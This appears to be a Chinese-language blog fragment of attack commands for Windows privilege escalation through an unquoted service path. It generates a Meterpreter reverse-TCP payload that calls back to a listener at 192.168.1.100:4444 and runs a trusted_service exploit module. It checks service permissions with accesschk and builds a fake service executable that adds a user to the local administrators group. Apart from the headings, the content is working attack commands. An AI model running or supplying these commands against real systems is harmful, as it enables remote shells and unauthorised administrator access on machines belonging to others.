<h2 id="meterpreter开启监听"><a href="#meterpreter开启监听" class="headerlink" title="meterpreter开启监听"></a>meterpreter开启监听</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">handler</span> -H <span class="hljs-number">192.168.1.100</span> -P <span class="hljs-number">4444</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br><br><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168.1.100</span> LPORT=<span class="hljs-number">4444</span> -f exe -o payload.exe<br><br><span class="hljs-attribute">search</span> trusted_service<br><span class="hljs-attribute">use</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">set</span> session <span class="hljs-number">1</span><br><span class="hljs-attribute">run</span><br></code></pre></div></td></tr></table></figure>
<h2 id="查看服务权限"><a href="#查看服务权限" class="headerlink" title="查看服务权限"></a>查看服务权限</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\U</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\A</span>ccesschk<span class="hljs-symbol">\a</span>ccesschk64.exe -wuvc unquotedsvc<br><br>C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\U</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\A</span>ccesschk<span class="hljs-symbol">\a</span>ccesschk64.exe /accepteula -uwcqv user *<br><br>sc qc unquotedsvc<br></code></pre></div></td></tr></table></figure>
<h2 id="生成伪造的服务"><a href="#生成伪造的服务" class="headerlink" title="生成伪造的服务"></a>生成伪造的服务</h2><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">msfvenom -p windows/exec <span class="hljs-attr">CMD=</span>&#x27;net localgroup administrators <span class="hljs-keyword">user</span> <span class="hljs-title">/add</span>&#x27; -f exe-service -o common.exe<br><br>sc <span class="hljs-literal">start</span> unquotedsvc<br>net localgroup administrators<br></code></pre></div></td></tr></table></figure>
